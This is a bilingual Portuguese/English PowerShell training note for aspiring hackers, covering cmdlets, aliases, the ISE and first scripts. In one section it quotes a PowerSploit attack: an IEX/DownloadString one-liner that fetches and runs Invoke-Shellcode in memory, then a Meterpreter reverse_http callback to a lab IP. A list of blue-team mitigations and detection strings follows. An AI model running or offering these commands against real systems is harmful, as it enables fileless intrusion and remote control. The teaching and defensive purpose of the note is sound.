Understand PowerShell's historical context (cmd.exe → MONAD → PowerShell 2.0); distinguish cmdlets (verb-noun) from BASH commands; use the help system; recognize Linux aliases; open and use PowerShell ISE; create, save, and run the first .ps1 script.

2. Contexto e Relevância / Context and Relevance Original

Um hacker profissional precisa de dominar Linux (90%+ das ferramentas nascem lá, maior granularidade de controlo, código aberto). Mas a Microsoft reconheceu as limitações do cmd.exe desde os anos 90 e respondeu com o PowerShell. O resultado é que o Windows se torna uma plataforma de ataque mais poderosa — e o PowerShell no sistema alvo é, ele próprio, um vetor de ataque. O artigo cita o PowerSploit e o Metasploit Web Delivery como exemplos de abuso do PowerShell na vítima. A professional hacker must master Linux (90%+ of tools originate there, finer control, open source). But Microsoft recognized cmd.exe limitations since the 90s and responded with PowerShell. The result: Windows becomes a more powerful attack platform — and PowerShell on the target is itself an attack vector. The article cites PowerSploit and Metasploit Web Delivery as examples of abusing PowerShell on the victim.

3. Cmdlets — O Coração do PowerShell / PowerShell's Core Original

A diferença fundamental face ao BASH: a Microsoft criou cmdlets (command-lets) — comandos únicos que executam tarefas por vezes complexas, semelhantes a funções. A forma é sempre verbo-substantivo. The fundamental difference from BASH: Microsoft created cmdlets (command-lets) — single commands that perform sometimes complex tasks, similar to functions. The form is always verb-noun. 
Get-Help          # verbo Get + substantivo Help
Write-Output      # verbo Write + substantivo Output
Get-ChildItem     # verbo Get + substantivo ChildItem (equivale a ls/dir)
Nota do formador / Trainer's note:
O autor observa que os cmdlets podem parecer "clunky" face aos aliases Linux — Get-ChildItem em vez de ls. Por isso, ele próprio usa ls. Os aliases existem precisamente para facilitar a transição de administradores Linux. The author notes cmdlets can feel "clunky" next to Linux aliases — Get-ChildItem instead of ls. That's why he uses ls himself. Aliases exist precisely to ease the transition for Linux admins.

4.5 Passo 5 — PowerShell ISE / Step 5 — PowerShell ISE Original

Para criar scripts, pode usar-se Notepad, Notepad++ ou o ISE (Integrated Scripting Environment), incluído no PowerShell. Abre-se escrevendo powershell na pesquisa e escolhendo "PowerShell ISE". To create scripts, you can use Notepad, Notepad++ or the ISE (Integrated Scripting Environment), bundled with PowerShell. Open it by typing powershell in search and choosing "PowerShell ISE".

ISE is deprecated in PowerShell 7+ (use VS Code with PowerShell extension). But for Windows PowerShell 5.1 (bundled in Windows), it still works and is what the article uses.

4.7 Exemplo Ofensivo Citado — PowerSploit Original

IEX(New-Object Net.WebClient).DownloadString("http://192.168.181.128:8000/CodeExecution/Invoke-Shellcode.ps1")
Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost 192.168.181.128 -lport 4444 -Force
Linha 1: New-Object Net.WebClient cria um cliente HTTP .NET; .DownloadString(...) descarrega o script Invoke-Shellcode.ps1 de um servidor HTTP controlado pelo atacante; IEX(...) = Invoke-Expression, que executa o conteúdo em memória — sem tocar no disco. É a técnica fileless clássica. Line 1: New-Object Net.WebClient creates a .NET HTTP client; .DownloadString(...) downloads Invoke-Shellcode.ps1 from an attacker-controlled HTTP server; IEX(...) = Invoke-Expression, which executes the content in memory — never touching disk. Classic fileless technique.
Linha 2: Invoke-Shellcode injeta o payload Meterpreter (windows/meterpreter/reverse_http) no processo atual, ligando de volta ao lhost:lport (192.168.181.128:4444). -Force confirma a execução sem prompt. Line 2: Invoke-Shellcode injects the Meterpreter payload (windows/meterpreter/reverse_http) into the current process, connecting back to lhost:lport (192.168.181.128:4444). -Force confirms execution without a prompt.
Contexto / Context:
O atacante aloja Invoke-Shellcode.ps1 via python3 -m http.server 8000 e tem um listener Metasploit (msfconsole → exploit/multi/handler). The attacker hosts Invoke-Shellcode.ps1 via python3 -m http.server 8000 and runs a Metasploit listener (msfconsole → exploit/multi/handler).

6. Mitigações Blue Team / Blue Team Mitigations Complementar / Complementary

  1. PowerShell Script Block Logging (Event ID 4104) — regista o código executado, mesmo ofuscado. / logs executed code, even obfuscated.
  2. Module Logging (Event ID 4103) — regista pipelines e parâmetros. / logs pipelines and parameters.
  3. Transcription — grava toda a sessão PowerShell em ficheiro. / records the entire PowerShell session to file.
  4. AMSI ativo — deteta IEX + DownloadString em tempo real. / detects IEX + DownloadString in real time.
  5. Constrained Language Mode — bloqueia New-Object, Add-Type, chamadas .NET arbitrárias. / blocks New-Object, Add-Type, arbitrary .NET calls.
  6. AppLocker/WDAC — restringe execução de .ps1 a caminhos assinados. / restricts .ps1 execution to signed paths.
  7. Bloquear powershell.exe para utilizadores que não precisam — via GPO/AppLocker. / Block powershell.exe for users who don't need it — via GPO/AppLocker.
  8. Monitorizar evento 4104 com strings como IEX, DownloadString, Invoke-Shellcode, FromBase64String. / Monitor event 4104 for these strings.
  9. Desativar PowerShell 2.0 — evita downgrade attacks. / Disable PowerShell 2.0 — prevents downgrade attacks. 
    Disable-WindowsOptionalFeature -FeatureName MicrosoftWindowsPowerShellV2 -Online
  10. Egress filtering — bloquear HTTP de saída para IPs não allowlisted. / block outbound HTTP to non-allowlisted IPs.
